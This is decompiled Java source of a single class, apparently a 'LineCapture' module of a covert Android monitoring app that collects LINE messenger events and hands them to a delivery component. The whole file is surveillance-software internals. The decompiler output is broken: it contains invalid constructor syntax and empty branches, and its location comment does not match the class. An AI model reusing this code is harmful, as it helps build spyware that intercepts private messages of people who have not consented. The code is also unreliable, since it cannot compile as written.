package com.vvt.capture.c;

import android.content.Context;
import com.vvt.base.RunningMode;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.e;
import com.vvt.base.capture.f;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class b
  extends com.vvt.base.capture.b
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  private com.vvt.base.a d;
  private String e;
  private e f;
  private f g;
  private Context h;
  private com.vvt.base.b i;
  
  public b(String paramString, com.vvt.base.a parama, RunningMode paramRunningMode, com.vvt.n.a.b paramb, Context paramContext, com.vvt.base.b paramb1)
  {
    this.e = paramString;
    this.d = parama;
    this.h = paramContext;
    this.i = paramb1;
    Object localObject1 = RunningMode.FULL;
    boolean bool;
    String str1;
    Object localObject2;
    if (paramRunningMode == localObject1)
    {
      bool = a;
      if (bool) {}
      localObject1 = new com/vvt/capture/c/a/a/b;
      ((com.vvt.capture.c.a.a.b)localObject1).<init>();
      this.f = ((e)localObject1);
      localObject1 = new com/vvt/capture/c/a/a/c;
      str1 = this.e;
      localObject2 = this.i;
      ((com.vvt.capture.c.a.a.c)localObject1).<init>(str1, (com.vvt.base.b)localObject2);
      this.g = ((f)localObject1);
    }
    for (;;)
    {
      return;
      localObject1 = RunningMode.LIMITED_1;
      if (paramRunningMode == localObject1)
      {
        c.a(paramRunningMode);
        bool = a;
        if (bool) {}
        localObject1 = new com/vvt/capture/c/a/b/a;
        str1 = this.e;
        localObject2 = this.h;
        String str2 = paramb1.f();
        ((com.vvt.capture.c.a.b.a)localObject1).<init>(str1, paramb, (Context)localObject2, str2);
        this.f = ((e)localObject1);
        localObject1 = new com/vvt/capture/c/a/b/b;
        str1 = this.e;
        localObject2 = this.i;
        ((com.vvt.capture.c.a.b.b)localObject1).<init>(str1, (com.vvt.base.b)localObject2);
        this.g = ((f)localObject1);
      }
      else
      {
        bool = c;
        if (!bool) {}
      }
    }
  }
  
  protected com.vvt.base.capture.g a(com.vvt.base.capture.g paramg)
  {
    boolean bool = paramg instanceof FxSimpleEventReference;
    if (bool) {
      paramg = (FxSimpleEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/base/capture/FxSimpleEventReference;
      paramg.<init>();
    }
  }
  
  public void a(com.vvt.base.b paramb)
  {
    this.i = paramb;
    boolean bool = b;
    if (bool) {}
  }
  
  protected void a(List paramList)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool1 = b;
    if (bool1) {}
    Iterator localIterator = paramList.iterator();
    for (;;)
    {
      bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      localObject = localIterator.next();
      boolean bool3 = localObject instanceof g;
      if (bool3)
      {
        bool3 = b;
        if (bool3) {}
        localObject = c.a((g)localObject);
        if (localObject != null)
        {
          int k = ((List)localObject).size();
          if (k > 0) {
            localArrayList.addAll((Collection)localObject);
          }
        }
      }
    }
    Object localObject = this.d;
    if (localObject != null)
    {
      int j = localArrayList.size();
      if (j > 0)
      {
        boolean bool2 = k();
        if (bool2)
        {
          bool2 = b;
          if (bool2) {}
          localObject = this.d;
          ((com.vvt.base.a)localObject).a(localArrayList);
        }
      }
    }
  }
  
  protected e b()
  {
    return this.f;
  }
  
  protected f c()
  {
    return this.g;
  }
  
  protected String d()
  {
    return "LineCapture";
  }
  
  protected String e()
  {
    return this.e;
  }
  
  protected String f()
  {
    return "line.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/MyUncaughtExceptionHandler/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */